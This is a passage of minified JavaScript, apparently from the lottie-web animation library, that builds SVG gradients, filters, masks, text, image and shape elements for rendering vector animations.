f=e.g.c;for(s=r.length,n=0;n<s;n+=1)(o=r[n]).setAttribute("offset",f[4*n]+"%"),o.setAttribute("stop-color","rgb("+f[4*n+1]+","+f[4*n+2]+","+f[4*n+3]+")")}if(h&&(e.g._omdf||i)){var g=e.g.o;for(s=(r=e.g._collapsable?e.cst:e.ost).length,n=0;n<s;n+=1)o=r[n],e.g._collapsable||o.setAttribute("offset",g[2*n]+"%"),o.setAttribute("stop-opacity",g[2*n+1])}if(1===t.t)(e.e._mdf||i)&&(l.setAttribute("x2",u[0]),l.setAttribute("y2",u[1]),h&&!e.g._collapsable&&(e.of.setAttribute("x2",u[0]),e.of.setAttribute("y2",u[1])));else if((e.s._mdf||e.e._mdf||i)&&(a=Math.sqrt(Math.pow(c[0]-u[0],2)+Math.pow(c[1]-u[1],2)),l.setAttribute("r",a),h&&!e.g._collapsable&&e.of.setAttribute("r",a)),e.e._mdf||e.h._mdf||e.a._mdf||i){a||(a=Math.sqrt(Math.pow(c[0]-u[0],2)+Math.pow(c[1]-u[1],2)));var y=Math.atan2(u[1]-c[1],u[0]-c[0]),v=a*(e.h.v>=1?.99:e.h.v<=-1?-.99:e.h.v),_=Math.cos(y+e.a.v)*v+c[0],b=Math.sin(y+e.a.v)*v+c[1];l.setAttribute("fx",_),l.setAttribute("fy",b),h&&!e.g._collapsable&&(e.of.setAttribute("fx",_),e.of.setAttribute("fy",b))}}function a(t,e,i){var r=e.style,n=e.d;n&&(n._mdf||i)&&n.dashStr&&(r.pElem.setAttribute("stroke-dasharray",n.dashStr),r.pElem.setAttribute("stroke-dashoffset",n.dashoffset[0])),e.c&&(e.c._mdf||i)&&r.pElem.setAttribute("stroke","rgb("+bm_floor(e.c.v[0])+","+bm_floor(e.c.v[1])+","+bm_floor(e.c.v[2])+")"),(e.o._mdf||i)&&r.pElem.setAttribute("stroke-opacity",e.o.v),(e.w._mdf||i)&&(r.pElem.setAttribute("stroke-width",e.w.v),r.msElem&&r.msElem.setAttribute("stroke-width",e.w.v))}return{createRenderFunction:function(t){switch(t.ty,t.ty){case"fl":return n;case"gf":return o;case"gs":return s;case"st":return a;case"sh":case"el":case"rc":case"sr":return r;case"tr":return i}}}}();function ShapeTransformManager(){this.sequences={},this.sequenceList=[],this.transform_key_count=0}function CVShapeData(t,e,i,r){this.styledShapes=[],this.tr=[0,0,0,0,0,0];var n=4;"rc"==e.ty?n=5:"el"==e.ty?n=6:"sr"==e.ty&&(n=7),this.sh=ShapePropertyFactory.getShapeProp(t,e,n,t);var s,o,a=i.length;for(s=0;s<a;s+=1)i[s].closed||(o={transforms:r.addTransformSequence(i[s].transforms),trNodes:[]},this.styledShapes.push(o),i[s].elements.push(o))}function BaseElement(){}function NullElement(t,e,i){this.initFrame(),this.initBaseData(t,e,i),this.initFrame(),this.initTransform(t,e,i),this.initHierarchy()}function SVGBaseElement(){}function IShapeElement(){}function ITextElement(){}function ICompElement(){}function IImageElement(t,e,i){this.assetData=e.getAssetData(t.refId),this.initElement(t,e,i),this.sourceRect={top:0,left:0,width:this.assetData.w,height:this.assetData.h}}function ISolidElement(t,e,i){this.initElement(t,e,i)}function SVGCompElement(t,e,i){this.layers=t.layers,this.supports3d=!0,this.completeLayers=!1,this.pendingElements=[],this.elements=this.layers?createSizedArray(this.layers.length):[],this.initElement(t,e,i),this.tm=t.tm?PropertyFactory.getProp(this,t.tm,0,e.frameRate,this):{_placeholder:!0}}function SVGTextElement(t,e,i){this.textSpans=[],this.renderType="svg",this.initElement(t,e,i)}function SVGShapeElement(t,e,i){this.shapes=[],this.shapesData=t.shapes,this.stylesList=[],this.shapeModifiers=[],this.itemsData=[],this.processedElements=[],this.animatedContents=[],this.initElement(t,e,i),this.prevViewData=[]}function SVGTintFilter(t,e){this.filterManager=e;var i=createNS("feColorMatrix");if(i.setAttribute("type","matrix"),i.setAttribute("color-interpolation-filters","linearRGB"),i.setAttribute("values","0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0"),i.setAttribute("result","f1"),t.appendChild(i),(i=createNS("feColorMatrix")).setAttribute("type","matrix"),i.setAttribute("color-interpolation-filters","sRGB"),i.setAttribute("values","1 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 1 0"),i.setAttribute("result","f2"),t.appendChild(i),this.matrixFilter=i,100!==e.effectElements[2].p.v||e.effectElements[2].p.k){var r,n=createNS("feMerge");t.appendChild(n),(r=createNS("feMergeNode")).setAttribute("in","SourceGraphic"),n.appendChild(r),(r=createNS("feMergeNode")).setAttribute("in","f2"),n.appendChild(r)}}function SVGFillFilter(t,e){this.filterManager=e;var i=createNS("feColorMatrix");i.setAttribute("type","matrix"),i.setAttribute("color-interpolation-filters","sRGB"),i.setAttribute("values","1 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 1 0"),t.appendChild(i),this.matrixFilter=i}function SVGGaussianBlurEffect(t,e){t.setAttribute("x","-100%"),t.setAttribute("y","-100%"),t.setAttribute("width","300%"),t.setAttribute("height","300%"),this.filterManager=e;var i=createNS("feGaussianBlur");t.appendChild(i),this.feGaussianBlur=i}function SVGStrokeEffect(t,e){this.initialized=!1,this.filterManager=e,this.elem=t,this.paths=[]}function SVGTritoneFilter(t,e){this.filterManager=e;var i=createNS("feColorMatrix");i.setAttribute("type","matrix"),i.setAttribute("color-interpolation-filters","linearRGB"),i.setAttribute("values","0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0"),i.setAttribute("result","f1"),t.appendChild(i);var r=createNS("feComponentTransfer");r.setAttribute("color-interpolation-filters","sRGB"),t.appendChild(r),this.matrixFilter=r;var n=createNS("feFuncR");n.setAttribute("type","table"),r.appendChild(n),this.feFuncR=n;var s=createNS("feFuncG");s.setAttribute("type","table"),r.appendChild(s),this.feFuncG=s;var o=createNS("feFuncB");o.setAttribute("type","table"),r.appendChild(o),this.feFuncB=o}function SVGProLevelsFilter(t,e){this.filterManager=e;var i=this.filterManager.effectElements,r=createNS("feComponentTransfer");(i[10].p.k||0!==i[10].p.v||i[11].p.k||1!==i[11].p.v||i[12].p.k||1!==i[12].p.v||i[13].p.k||0!==i[13].p.v||i[14].p.k||1!==i[14].p.v)&&(this.feFuncR=this.createFeFunc("feFuncR",r)),(i[17].p.k||0!==i[17].p.v||i[18].p.k||1!==i[18].p.v||i[19].p.k||1!==i[19].p.v||i[20].p.k||0!==i[20].p.v||i[21].p.k||1!==i[21].p.v)&&(this.feFuncG=this.createFeFunc("feFuncG",r)),(i[24].p.k||0!==i[24].p.v||i[25].p.k||1!==i[25].p.v||i[26].p.k||1!==i[26].p.v||i[27].p.k||0!==i[27].p.v||i[28].p.k||1!==i[28].p.v)&&(this.feFuncB=this.createFeFunc("feFuncB",r)),(i[31].p.k||0!==i[31].p.v||i[32].p.k||1!==i[32].p.v||i[33].p.k||1!==i[33].p.v||i[34].p.k||0!==i[34].p.v||i[35].p.k||1!==i[35].p.v)&&(this.feFuncA=this.createFeFunc("feFuncA",r)),(this.feFuncR||this.feFuncG||this.feFuncB||this.feFuncA)&&(r.setAttribute("color-interpolation-filters","sRGB"),t.appendChild(r),r=createNS("feComponentTransfer")),(i[3].p.k||0!==i[3].p.v||i[4].p.k||1!==i[4].p.v||i[5].p.k||1!==i[5].p.v||i[6].p.k||0!==i[6].p.v||i[7].p.k||1!==i[7].p.v)&&(r.setAttribute("color-interpolation-filters","sRGB"),t.appendChild(r),this.feFuncRComposed=this.createFeFunc("feFuncR",r),this.feFuncGComposed=this.createFeFunc("feFuncG",r),this.feFuncBComposed=this.createFeFunc("feFuncB",r))}function SVGDropShadowEffect(t,e){var i=e.container.globalData.renderConfig.filterSize;t.setAttribute("x",i.x),t.setAttribute("y",i.y),t.setAttribute("width",i.width),t.setAttribute("height",i.height),this.filterManager=e;var r=createNS("feGaussianBlur");r.setAttribute("in","SourceAlpha"),r.setAttribute("result","drop_shadow_1"),r.setAttribute("stdDeviation","0"),this.feGaussianBlur=r,t.appendChild(r);var n=createNS("feOffset");n.setAttribute("dx","25"),n.setAttribute("dy","0"),n.setAttribute("in","drop_shadow_1"),n.setAttribute("result","drop_shadow_2"),this.feOffset=n,t.appendChild(n);var s=createNS("feFlood");s.setAttribute("flood-color","#00ff00"),s.setAttribute("flood-opacity","1"),s.setAttribute("result","drop_shadow_3"),this.feFlood=s,t.appendChild(s);var o=createNS("feComposite");o.setAttribute("in","drop_shadow_3"),o.setAttribute("in2","drop_shadow_2"),o.setAttribute("operator","in"),o.setAttribute("result","drop_shadow_4"),t.appendChild(o);var a,l=createNS("feMerge");t.appendChild(l),a=createNS("feMergeNode"),l.appendChild(a),(a=createNS("feMergeNode")).setAttribute("in","SourceGraphic"),this.feMergeNode=a,this.feMerge=l,this.originalNodeAdded=!1,l.appendChild(a)}ShapeTransformManager.prototype={addTransformSequence:function(t){var e,i=t.length,r="_";for(e=0;e<i;e+=1)r+=t[e].transform.key+"_";var n=this.sequences[r];return n||(n={transforms:[].concat(t),finalTransform:new Matrix,_mdf:!1},this.sequences[r]=n,this.sequenceList.push(n)),n},processSequence:function(t,e){for(var i=0,r=t.transforms.length,n=e;i<r&&!e;){if(t.transforms[i].transform.mProps._mdf){n=!0;break}i+=1}var s;if(n)for(t.finalTransform.reset(),i=r-1;i>=0;i-=1)s=t.transforms[i].transform.mProps.v.props,t.finalTransform.transform(s[0],s[1],s[2],s[3],s[4],s[5],s[6],s[7],s[8],s[9],s[10],s[11],s[12],s[13],s[14],s[15]);t._mdf=n},processSequences:function(t){var e,i=this.sequenceList.length;for(e=0;e<i;e+=1)this.processSequence(this.sequenceList[e],t)},getNewKey:function(){return"_"+this.transform_key_count++}},CVShapeData.prototype.setAsAnimated=SVGShapeData.prototype.setAsAnimated,BaseElement.prototype={checkMasks:function(){if(!this.data.hasMask)return!1;for(var t=0,e=this.data.masksProperties.length;t<e;){if("n"!==this.data.masksProperties[t].mode&&!1!==this.data.masksProperties[t].cl)return!0;t+=1}return!1},initExpressions:function(){this.layerInterface=LayerExpressionInterface(this),this.data.hasMask&&this.maskManager&&this.layerInterface.registerMaskInterface(this.maskManager);var t=EffectsExpressionInterface.createEffectsInterface(this,this.layerInterface);this.layerInterface.registerEffectsInterface(t),0===this.data.ty||this.data.xt?this.compInterface=CompExpressionInterface(this):4===this.data.ty?(this.layerInterface.shapeInterface=ShapeExpressionInterface(this.shapesData,this.itemsData,this.layerInterface),this.layerInterface.content=this.layerInterface.shapeInterface):5===this.data.ty&&(this.layerInterface.textInterface=TextExpressionInterface(this),this.layerInterface.text=this.layerInterface.textInterface)},setBlendMode:function(){var t=getBlendMode(this.data.bm);(this.baseElement||this.layerElement).style["mix-blend-mode"]=t},initBaseData:function(t,e,i){this.globalData=e,this.comp=i,this.data=t,this.layerId=createElementID(),this.data.sr||(this.data.sr=1),this.effectsManager=new EffectsManager(this.data,this,this.dynamicProperties)},getType:function(){return this.type},sourceRectAtTime:function(){}},NullElement.prototype.prepareFrame=function(t){this.prepareProperties(t,!0)},NullElement.prototype.renderFrame=function(){},NullElement.prototype.getBaseElement=function(){return null},NullElement.prototype.destroy=function(){},NullElement.prototype.sourceRectAtTime=function(){},NullElement.prototype.hide=function(){},extendPrototype([BaseElement,TransformElement,HierarchyElement,FrameElement],NullElement),SVGBaseElement.prototype={initRendererElement:function(){this.layerElement=createNS("g")},createContainerElements:function(){this.matteElement=createNS("g"),this.transformedElement=this.layerElement,this.maskedElement=this.layerElement,this._sizeChanged=!1;var t,e,i,r=null;if(this.data.td){if(3==this.data.td||1==this.data.td){var n=createNS("mask");n.setAttribute("id",this.layerId),n.setAttribute("mask-type",3==this.data.td?"luminance":"alpha"),n.appendChild(this.layerElement),r=n,this.globalData.defs.appendChild(n),!featureSupport.maskType&&1==this.data.td&&(n.setAttribute("mask-type","luminance"),t=createElementID(),e=filtersFactory.createFilter(t),this.globalData.defs.appendChild(e),e.appendChild(filtersFactory.createAlphaToLuminanceFilter()),(i=createNS("g")).appendChild(this.layerElement),r=i,n.appendChild(i),i.setAttribute("filter","url("+locationHref+"#"+t+")"))}else if(2==this.data.td){var s=createNS("mask");s.setAttribute("id",this.layerId),s.setAttribute("mask-type","alpha");var o=createNS("g");s.appendChild(o),t=createElementID(),e=filtersFactory.createFilter(t);var a=createNS("feComponentTransfer");a.setAttribute("in","SourceGraphic"),e.appendChild(a);var l=createNS("feFuncA");l.setAttribute("type","table"),l.setAttribute("tableValues","1.0 0.0"),a.appendChild(l),this.globalData.defs.appendChild(e);var h=createNS("rect");h.setAttribute("width",this.comp.data.w),h.setAttribute("height",this.comp.data.h),h.setAttribute("x","0"),h.setAttribute("y","0"),h.setAttribute("fill","#ffffff"),h.setAttribute("opacity","0"),o.setAttribute("filter","url("+locationHref+"#"+t+")"),o.appendChild(h),o.appendChild(this.layerElement),r=o,featureSupport.maskType||(s.setAttribute("mask-type","luminance"),e.appendChild(filtersFactory.createAlphaToLuminanceFilter()),i=createNS("g"),o.appendChild(h),i.appendChild(this.layerElement),r=i,o.appendChild(i)),this.globalData.defs.appendChild(s)}}else this.data.tt?(this.matteElement.appendChild(this.layerElement),r=this.matteElement,this.baseElement=this.matteElement):this.baseElement=this.layerElement;if(this.data.ln&&this.layerElement.setAttribute("id",this.data.ln),this.data.cl&&this.layerElement.setAttribute("class",this.data.cl),0===this.data.ty&&!this.data.hd){var c=createNS("clipPath"),u=createNS("path");u.setAttribute("d","M0,0 L"+this.data.w+",0 L"+this.data.w+","+this.data.h+" L0,"+this.data.h+"z");var d=createElementID();if(c.setAttribute("id",d),c.appendChild(u),this.globalData.defs.appendChild(c),this.checkMasks()){var p=createNS("g");p.setAttribute("clip-path","url("+locationHref+"#"+d+")"),p.appendChild(this.layerElement),this.transformedElement=p,r?r.appendChild(this.transformedElement):this.baseElement=this.transformedElement}else this.layerElement.setAttribute("clip-path","url("+locationHref+"#"+d+")")}0!==this.data.bm&&this.setBlendMode()},renderElement:function(){this.finalTransform._matMdf&&this.transformedElement.setAttribute("transform",this.finalTransform.mat.to2dCSS()),this.finalTransform._opMdf&&this.transformedElement.setAttribute("opacity",this.finalTransform.mProp.o.v)},destroyBaseElement:function(){this.layerElement=null,this.matteElement=null,this.maskManager.destroy()},getBaseElement:function(){return this.data.hd?null:this.baseElement},createRenderableComponents:function(){this.maskManager=new MaskElement(this.data,this,this.globalData),this.renderableEffectsManager=new SVGEffects(this)},setMatte:function(t){!this.matteElement||this.matteElement.setAttribute("mask","url("+locationHref+"#"+t+")")}},IShapeElement.prototype={addShapeToModifiers:function(t){var e,i=this.shapeModifiers.length;for(e=0;e<i;e+=1)this.shapeModifiers[e].addShape(t)},isShapeInAnimatedModifiers:function(t){for(var e=this.shapeModifiers.length;0<e;)if(this.shapeModifiers[0].isAnimatedWithShape(t))return!0;return!1},renderModifiers:function(){if(this.shapeModifiers.length){var t,e=this.shapes.length;for(t=0;t<e;t+=1)this.shapes[t].sh.reset();for(t=(e=this.shapeModifiers.length)-1;t>=0;t-=1)this.shapeModifiers[t].processShapes(this._isFirstFrame)}},lcEnum:{1:"butt",2:"round",3:"square"},ljEnum:{1:"miter",2:"round",3:"bevel"},searchProcessedElement:function(t){for(var e=this.processedElements,i=0,r=e.length;i<r;){if(e[i].elem===t)return e[i].pos;i+=1}return 0},addProcessedElement:function(t,e){for(var i=this.processedElements,r=i.length;r;)if(i[r-=1].elem===t)return void(i[r].pos=e);i.push(new ProcessedElement(t,e))},prepareFrame:function(t){this.prepareRenderableFrame(t),this.prepareProperties(t,this.isInRange)}},ITextElement.prototype.initElement=function(t,e,i){this.lettersChangedFlag=!0,this.initFrame(),this.initBaseData(t,e,i),this.textProperty=new TextProperty(this,t.t,this.dynamicProperties),this.textAnimator=new TextAnimatorProperty(t.t,this.renderType,this),this.initTransform(t,e,i),this.initHierarchy(),this.initRenderable(),this.initRendererElement(),this.createContainerElements(),this.createRenderableComponents(),this.createContent(),this.hide(),this.textAnimator.searchProperties(this.dynamicProperties)},ITextElement.prototype.prepareFrame=function(t){this._mdf=!1,this.prepareRenderableFrame(t),this.prepareProperties(t,this.isInRange),(this.textProperty._mdf||this.textProperty._isFirstFrame)&&(this.buildNewText(),this.textProperty._isFirstFrame=!1,this.textProperty._mdf=!1)},ITextElement.prototype.createPathShape=function(t,e){var i,r,n=e.length,s="";for(i=0;i<n;i+=1)r=e[i].ks.k,s+=buildShapeString(r,r.i.length,!0,t);return s},ITextElement.prototype.updateDocumentData=function(t,e){this.textProperty.updateDocumentData(t,e)},ITextElement.prototype.canResizeFont=function(t){this.textProperty.canResizeFont(t)},ITextElement.prototype.setMinimumFontSize=function(t){this.textProperty.setMinimumFontSize(t)},ITextElement.prototype.applyTextPropertiesToMatrix=function(t,e,i,r,n){switch(t.ps&&e.translate(t.ps[0],t.ps[1]+t.ascent,0),e.translate(0,-t.ls,0),t.j){case 1:e.translate(t.justifyOffset+(t.boxWidth-t.lineWidths[i]),0,0);break;case 2:e.translate(t.justifyOffset+(t.boxWidth-t.lineWidths[i])/2,0,0)}e.translate(r,n,0)},ITextElement.prototype.buildColor=function(t){return"rgb("+Math.round(255*t[0])+","+Math.round(255*t[1])+","+Math.round(255*t[2])+")"},ITextElement.prototype.emptyProp=new LetterProps,ITextElement.prototype.destroy=function(){},extendPrototype([BaseElement,TransformElement,HierarchyElement,FrameElement,RenderableDOMElement],ICompElement),ICompElement.prototype.initElement=function(t,e,i){this.initFrame(),this.initBaseData(t,e,i),this.initTransform(t,e,i),this.initRenderable(),this.initHierarchy(),this.initRendererElement(),this.createContainerElements(),this.createRenderableComponents(),(this.data.xt||!e.progressiveLoad)&&this.buildAllItems(),this.hide()},ICompElement.prototype.prepareFrame=function(t){if(this._mdf=!1,this.prepareRenderableFrame(t),this.prepareProperties(t,this.isInRange),this.isInRange||this.data.xt){if(this.tm._placeholder)this.renderedFrame=t/this.data.sr;else{var e=this.tm.v;e===this.data.op&&(e=this.data.op-1),this.renderedFrame=e}var i,r=this.elements.length;for(this.completeLayers||this.checkLayers(this.renderedFrame),i=r-1;i>=0;i-=1)(this.completeLayers||this.elements[i])&&(this.elements[i].prepareFrame(this.renderedFrame-this.layers[i].st),this.elements[i]._mdf&&(this._mdf=!0))}},ICompElement.prototype.renderInnerContent=function(){var t,e=this.layers.length;for(t=0;t<e;t+=1)(this.completeLayers||this.elements[t])&&this.elements[t].renderFrame()},ICompElement.prototype.setElements=function(t){this.elements=t},ICompElement.prototype.getElements=function(){return this.elements},ICompElement.prototype.destroyElements=function(){var t,e=this.layers.length;for(t=0;t<e;t+=1)this.elements[t]&&this.elements[t].destroy()},ICompElement.prototype.destroy=function(){this.destroyElements(),this.destroyBaseElement()},extendPrototype([BaseElement,TransformElement,SVGBaseElement,HierarchyElement,FrameElement,RenderableDOMElement],IImageElement),IImageElement.prototype.createContent=function(){var t=this.globalData.getAssetsPath(this.assetData);this.innerElem=createNS("image"),this.innerElem.setAttribute("width",this.assetData.w+"px"),this.innerElem.setAttribute("height",this.assetData.h+"px"),this.innerElem.setAttribute("preserveAspectRatio",this.assetData.pr||this.globalData.renderConfig.imagePreserveAspectRatio),this.innerElem.setAttributeNS("http://www.w3.org/1999/xlink","href",t),this.layerElement.appendChild(this.innerElem)},IImageElement.prototype.sourceRectAtTime=function(){return this.sourceRect},extendPrototype([IImageElement],ISolidElement),ISolidElement.prototype.createContent=function(){var t=createNS("rect");t.setAttribute("width",this.data.sw),t.setAttribute("height",this.data.sh),t.setAttribute("fill",this.data.sc),this.layerElement.appendChild(t)},extendPrototype([SVGRenderer,ICompElement,SVGBaseElement],SVGCompElement),extendPrototype([BaseElement,TransformElement,SVGBaseElement,HierarchyElement,FrameElement,RenderableDOMElement,ITextElement],SVGTextElement),SVGTextElement.prototype.createContent=function(){this.data.singleShape&&!this.globalData.fontManager.chars&&(this.textContainer=createNS("text"))},SVGTextElement.prototype.buildTextContents=function(t){for(var e=0,i=t.length,r=[],n="";e<i;)t[e]===String.fromCharCode(13)||t[e]===String.fromCharCode(3)?(r.push(n),n=""):n+=t[e],e+=1;return r.push(n),r},SVGTextElement.prototype.buildNewText=function(){var t,e,i=this.textProperty.currentData;this.renderedLetters=createSizedArray(i?i.l.length:0),i.fc?this.layerElement.setAttribute("fill",this.buildColor(i.fc)):this.layerElement.setAttribute("fill","rgba(0,0,0,0)"),i.sc&&(this.layerElement.setAttribute("stroke",this.buildColor(i.sc)),this.layerElement.setAttribute("stroke-width",i.sw)),this.layerElement.setAttribute("font-size",i.finalSize);var r=this.globalData.fontManager.getFontByName(i.f);if(r.fClass)this.layerElement.setAttribute("class",r.fClass);else{this.layerElement.setAttribute("font-family",r.fFamily);var n=i.fWeight,s=i.fStyle;this.layerElement.setAttribute("font-style",s),this.layerElement.setAttribute("font-weight",n)}this.layerElement.setAttribute("aria-label",i.t);var o=i.l||[],a=!!this.globalData.fontManager.chars;e=o.length;var l,h,c=this.mHelper,u="",d=this.data.singleShape,p=0,m=0,f=!0,g=i.tr/1e3*i.finalSize;if(!d||a||i.sz){var y,v,_=this.textSpans.length;for(t=0;t<e;t+=1)(!a||!d||0===t)&&(l=_>t?this.textSpans[t]:createNS(a?"path":"text"),_<=t&&(l.setAttribute("stroke-linecap","butt"),l.setAttribute("stroke-linejoin","round"),l.setAttribute("stroke-miterlimit","4"),this.textSpans[t]=l,this.layerElement.appendChild(l)),l.style.display="inherit"),c.reset(),c.scale(i.finalSize/100,i.finalSize/100),d&&(o[t].n&&(p=-g,m+=i.yOffset,m+=f?1:0,f=!1),this.applyTextPropertiesToMatrix(i,c,o[t].line,p,m),p+=o[t].l||0,p+=g),a?(h=(y=(v=this.globalData.fontManager.getCharData(i.finalText[t],r.fStyle,this.globalData.fontManager.getFontByName(i.f).fFamily))&&v.data||{}).shapes?y.shapes[0].it:[],d?u+=this.createPathShape(c,h):l.setAttribute("d",this.createPathShape(c,h))):(d&&l.setAttribute("transform","translate("+c.props[12]+","+c.props[13]+")"),l.textContent=o[t].val,l.setAttributeNS("http://www.w3.org/XML/1998/namespace","xml:space","preserve"));d&&l&&l.setAttribute("d",u)}else{var b=this.textContainer,w="start";switch(i.j){case 1:w="end";break;case 2:w="middle"}b.setAttribute("text-anchor",w),b.setAttribute("letter-spacing",g);var E=this.buildTextContents(i.finalText);for(e=E.length,m=i.ps?i.ps[1]+i.ascent:0,t=0;t<e;t+=1)(l=this.textSpans[t]||createNS("tspan")).textContent=E[t],l.setAttribute("x",0),l.setAttribute("y",m),l.style.display="inherit",b.appendChild(l),this.textSpans[t]=l,m+=i.finalLineHeight;this.layerElement.appendChild(b)}for(;t<this.textSpans.length;)this.textSpans[t].style.display="none",t+=1;this._sizeChanged=!0},SVGTextElement.prototype.sourceRectAtTime=function(t){if(this.prepareFrame(this.comp.renderedFrame-this.data.st),this.renderInnerContent(),this._sizeChanged){this._sizeChanged=!1;var e=this.layerElement.getBBox();this.bbox={top:e.y,left:e.x,width:e.width,height:e.height}}return this.bbox},SVGTextElement.prototype.renderInnerContent=function(){if(!this.data.singleShape&&(this.textAnimator.getMeasures(this.textProperty.currentData,this.lettersChangedFlag),this.lettersChangedFlag||this.textAnimator.lettersChangedFlag)){this._sizeChanged=!0;var t,e,i,r,n=this.textAnimator.renderedLetters,s=this.textProperty.currentData.l;for(e=s.length,t=0;t<e;t+=1)s[t].n||(i=n[t],r=this.textSpans[t],i._mdf.m&&r.setAttribute("transform",i.m),i._mdf.o&&r.setAttribute("opacity",i.o),i._mdf.sw&&r.setAttribute("stroke-width",i.sw),i._mdf.sc&&r.setAttribute("stroke",i.sc),i._mdf.fc&&r.setAttribute("fill",i.fc))}},extendPrototype([BaseElement,TransformElement,SVGBaseElement,IShapeElement,HierarchyElement,FrameElement,RenderableDOMElement],SVGShapeElement),SVGShapeElement.prototype.initSecondaryElement=function(){},SVGShapeElement.prototype.identityMatrix=new Matrix,SVGShapeElement.prototype.buildExpressionInterface=function(){},SVGShapeElement.prototype.createContent=function(){this.searchShapes(this.shapesData,this.itemsData,this.prevViewData,this.layerElement,0,[],!0),this.filterUniqueShapes()},SVGShapeElement.prototype.filterUniqueShapes=function(){var t,e,i,r,n=this.shapes.length,s=this.stylesList.length,o=[],a=!1;for(i=0;i<s;i+=1){for(r=this.stylesList[i],a=!1,o.length=0,t=0;t<n;t+=1)-1!==(e=this.shapes[t]).styles.indexOf(r)&&(o.push(e),a=e._isAnimated||a);o.length>1&&a&&this.setShapesAsAnimated(o)}},SVGShapeElement.prototype.setShapesAsAnimated=function(t){var e,i=t.length;for(e=0;e<i;e+=1)t[e].setAsAnimated()},SVGShapeElement.prototype.createStyleElement=function(t,e){var i,r=new SVGStyleData(t,e),n=r.pElem;return"st"===t.ty?i=new SVGStrokeStyleData(this,t,r):"fl"===t.ty?i=new SVGFillStyleData(this,t,r):"gf"!==t.ty&&"gs"!==t.ty||(i=new("gf"===t.ty?SVGGradientFillStyleData:SVGGradientStrokeStyleData)(this,t,r),this.globalData.defs.appendChild(i.gf),i.maskId&&(this.globalData.defs.appendChild(i.ms),this.globalData.defs.appendChild(i.of),n.setAttribute("mask","url("+locationHref+"#"+i.maskId+")"))),("st"===t.ty||"gs"===t.ty)&&(n.setAttribute("stroke-linecap",this.lcEnum[t.lc]||"round"),n.setAttribute("stroke-linejoin",this.ljEnum[t.lj]||"round"),n.setAttribute("fill-opacity","0"),1===t.lj&&n.setAttribute("stroke-miterlimit",t.ml)),2===t.r&&n.setAttribute("fill-rule","evenodd"),t.ln&&n.setAttribute("id",t.ln),t.cl&&n.setAttribute("class",t.cl),t.bm&&(n.style["mix-blend-mode"]=getBlendMode(t.bm)),this.stylesList.push(r),this.addToAnimatedContents(t,i),i},SVGShapeElement.prototype.createGroupElement=function(t){var e=new ShapeGroupData;return t.ln&&e.gr.setAttribute("id",t.ln),t.cl&&e.gr.setAttribute("class",t.cl),t.bm&&(e.gr.style["mix-blend-mode"]=getBlendMode(t.bm)),e},SVGShapeElement.prototype.createTransformElement=function(t,e){var i=TransformPropertyFactory.getTransformProperty(this,t,this),r=new SVGTransformData(i,i.o,e);return this.addToAnimatedContents(t,r),r},SVGShapeElement.prototype.createShapeElement=function(t,e,i){var r=4;"rc"===t.ty?r=5:"el"===t.ty?r=6:"sr"===t.ty&&(r=7);var n=new SVGShapeData(e,i,ShapePropertyFactory.getShapeProp(this,t,r,this));return this.shapes.push(n),this.addShapeToModifiers(n),this.addToAnimatedContents(t,n),n},SVGShapeElement.prototype.addToAnimatedContents=function(t,e){for(var i=0,r=this.animatedContents.length;i<r;){if(this.animatedContents[i].element===e)return;i+=1}this.animatedContents.push({fn:SVGElementsRenderer.createRenderFunction(t),element:e,data:t})},SVGShapeElement.prototype.setElementStyles=function(t){var e,i=t.styles,r=this.stylesList.length;for(e=0;e<r;e+=1)this.stylesList[e].closed||i.push(this.stylesList[e])},SVGShapeElement.prototype.reloadShapes=function(){this._isFirstFrame=!0;var t,e=this.itemsData.length;for(t=0;t<e;t+=1)this.prevViewData[t]=this.itemsData[t];for(this.searchShapes(this.shapesData,this.itemsData,this.prevViewData,this.layerElement,0,[],!0),this.filterUniqueShapes(),e=this.dynamicProperties.length,t=0;t<e;t+=1)this.dynamicProperties[t].getValue();this.renderModifiers()},SVGShapeElement.prototype.searchShapes=function(t,e,i,r,n,s,o){var a,l,h,c,u,d,p=[].concat(s),m=t.length-1,f=[],g=[];for(a=m;a>=0;a-=1){if((d=this.searchProcessedElement(t[a]))?e[a]=i[d-1]:t[a]._render=o,"fl"==t[a].ty||"st"==t[a].ty||"gf"==t[a].ty||"gs"==t[a].ty)d?e[a].style.closed=!1:e[a]=this.createStyleElement(t[a],n),t[a]._render&&r.appendChild(e[a].style.pElem),f.push(e[a].style);else if("gr"==t[a].ty){if(d)for(h=e[a].it.length,l=0;l<h;l+=1)e[a].prevViewData[l]=e[a].it[l];else e[a]=this.createGroupElement(t[a]);this.searchShapes(t[a].it,e[a].it,e[a].prevViewData,e[a].gr,n+1,p,o),t[a]._render&&r.appendChild(e[a].gr)}else"tr"==t[a].ty?(d||(e[a]=this.createTransformElement(t[a],r)),c=e[a].transform,p.push(c)):"sh"==t[a].ty||"rc"==t[a].ty||"el"==t[a].ty||"sr"==t[a].ty?(d||(e[a]=this.createShapeElement(t[a],p,n)),this.setElementStyles(e[a])):"tm"==t[a].ty||"rd"==t[a].ty||"ms"==t[a].ty?(d?(u=e[a]).closed=!1:((u=ShapeModifiers.getModifier(t[a].ty)).init(this,t[a]),e[a]=u,this.shapeModifiers.push(u)),g.push(u)):"rp"==t[a].ty&&(d?(u=e[a]).closed=!0:(u=ShapeModifiers.getModifier(t[a].ty),e[a]=u,u.init(this,t,a,e),this.shapeModifiers.push(u),o=!1),g.push(u));this.addProcessedElement(t[a],a+1)}for(m=f.length,a=0;a<m;a+=1)f[a].closed=!0;for(m=g.length,a=0;a<m;a+=1)g[a].closed=!0},SVGShapeElement.prototype.renderInnerContent=function(){this.renderModifiers();var t,e=this.stylesList.length;for(t=0;t<e;t+=1)this.stylesList[t].reset();for(this.renderShape(),t=0;t<e;t+=1)(this.stylesList[t]._mdf||this._isFirstFrame)&&(this.stylesList[t].msElem&&(this.stylesList[t].msElem.setAttribute("d",this.stylesList[t].d),this.stylesList[t].d="M0 0"+this.stylesList[t].d),this.stylesList[t].pElem.setAttribute("d",this.stylesList[t].d||"M0 0"))},SVGShapeElement.prototype.renderShape=function(){var 